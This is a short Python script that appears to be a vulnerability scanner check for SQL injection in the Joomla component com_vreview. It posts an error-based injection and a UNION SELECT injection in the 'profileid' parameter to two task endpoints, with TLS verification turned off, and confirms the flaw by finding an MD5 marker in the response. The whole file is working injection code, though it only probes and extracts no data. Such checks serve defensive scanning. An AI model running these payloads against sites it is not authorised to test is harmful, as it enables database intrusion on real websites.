import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
def substr(strs,s,lens):
	result=strs[s:lens]
	return result
r1=randomInt(800000000, 1000000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?option=com_vreview&task=displayReply"
	body="profileid=-8511 OR 1 GROUP BY CONCAT(0x7e,md5("+str(r1)+"),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if substr(md5(str(r1).encode()).hexdigest(), 0, 31) in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"index.php?option=com_vreview&task=editReview"
	body="profileid=1 union select CONCAT_WS(0x203a20,md5("+str(r1)+"),0x203a20,0x203a20)-- -"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if substr(md5(str(r1).encode()).hexdigest(), 0, 31) in response.text:
		r00=True
	else:
		r00=False
	if r0 or r00:
		return True
	else:
		return False

